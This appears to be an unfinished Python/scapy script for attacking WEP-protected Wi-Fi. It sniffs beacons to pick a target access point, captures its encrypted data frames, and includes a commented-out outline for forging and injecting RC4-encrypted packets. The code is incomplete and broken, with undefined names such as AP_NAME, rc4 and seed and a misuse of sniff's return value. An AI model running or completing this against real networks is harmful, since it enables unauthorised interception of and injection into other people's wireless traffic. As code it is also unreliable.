from scapy.all import Dot11Beacon, Dot11WEP, sniff
import binascii
import sys
import zlib

info = []
packets = []

def beacon_targetting(pkt):
    global info
    if Dot11Beacon in pkt:
        if pkt.info == AP_NAME:
            info = [pkt.info, pkt.addr1, pkt.addr2, pkt.addr3]

def target_listening(pkt):
    global info
    if Dot11Beacon not in pkt and pkt.addr1 != 'ff:ff:ff:ff:ff:ff' and (pkt.addr1 == info[1] or pkt.addr2 == info[1] or pkt.addr3 == info[1]):
        if pkt.type == 2 and Dot11WEP in pkt:
                return pkt


info = sniff(count=int(sys.argv[1]), iface="wlan0mon", prn=beacon_targetting)

if info[1] == 'ff:ff:ff:ff:ff:ff':
    del info[1]
if info[1] == info[2]:
    del info[2]

packets = sniff(count=int(sys.argv[2]), iface="wlan0mon", prn=target_listening)

for pkt in packets:

    # stack = LLC()/IP(src='192.168.1.1', dst='192.168.1.129')/UDP(sport=44444, dport=37020, len=len(msg))/msg
    # cyphered = rc4(bytes(stack), seed)
    # pkt[Dot11WEP].wepdata = cyphered
    # pkt[Dot11WEP].icv = zlib.crc32(bytes(stack))
    # pkt.addr1 = pkt.addr2
    # pkt.addr2 = pkt.addr3
    # sendp(pkt, iface='wlan0mon')


